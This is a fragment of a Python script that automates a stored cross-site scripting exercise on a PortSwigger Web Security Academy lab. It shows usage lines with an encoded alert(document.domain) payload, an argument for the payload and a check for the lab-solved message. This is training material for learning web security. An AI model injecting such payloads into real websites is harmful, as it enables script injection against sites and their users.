...
Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "&apos;-alert(document.domain)-&apos;" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "&apos;-alert(document.domain)-&apos;" 
...
parser.add_argument('-c', '--command', help='Command to run, Example: &apos;-alert(document.domain)-&apos;', required=True)
...
def xss(url, command, csrf, path):
    ...
    if args.proxy:
        ...
        if (b'Congratulations, you solved the lab!' in r.content):
            ...
            print("Click <author> in the comments in order to view the XSS")
            subprocess.call(["firefox", url + path])
        else:
